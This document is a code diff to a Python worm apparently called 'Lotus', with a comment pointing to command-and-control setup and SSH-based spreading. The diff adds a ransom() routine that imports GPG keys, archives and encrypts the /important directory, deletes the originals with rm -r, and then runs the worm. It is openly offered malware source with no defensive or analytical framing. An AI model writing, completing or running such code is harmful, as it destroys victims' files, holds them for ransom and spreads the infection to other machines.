@@ -6,7 +6,10 @@ from subprocess import Popen, PIPE
 import base64
 from os import path
 import time
-ssh_command = "/Lotus/Lotus.py; exit"                               ## Add command and control server info here, as well as running the worm itself.
+import tkinter.messagebox
+import tkinter
+from tkinter import *
+ssh_command = "/Lotus/Lotus.py; exit"                                             ## Add command and control server info here, as well as running the worm itself.
 #cron = "* * * * * /Lotus/Lotus.py \n"
 
 def subnet():                                                                     #This runs first
@@ -90,8 +93,28 @@ def check():
         print('Target(s) validated:' + str(target_list))
         return(target_list)
 
+def ransom():
+    if path.exists('/important') == True:
+        print('Root Path Found')
+        dir1 = "important"
+        #cwd = os.getcwd()
+        subprocess.Popen(["gpg --batch --always-trust --passphrase '' --yes --import /Lotus/public.key"], shell=True)
+        subprocess.Popen(["gpg --batch --always-trust --passphrase '' --yes --import /Lotus/secret.key"], shell=True)
+        subprocess.run(['cd / ; tar czf ' + dir1 + '.tar.gz ' + dir1], shell=True)
+        subprocess.run(['cd / ; gpg -e -r encryptor ' + dir1 + '.tar.gz'], shell=True)
+        if path.exists('/' + dir1 + '.tar.gz.gpg' ) == True:
+            subprocess.run(['rm -r /' + dir1], shell=True)
+            subprocess.run(['rm /' + dir1 + '.tar.gz ' ], shell=True)
+            print("files encrypted")
+        else:
+            print("files were not deleted and or encrypted")
+        worm()
+    else:
+        worm()
+
+
 def main():
-    worm()
+    ransom()
 if __name__ == '__main__':
     main()
 
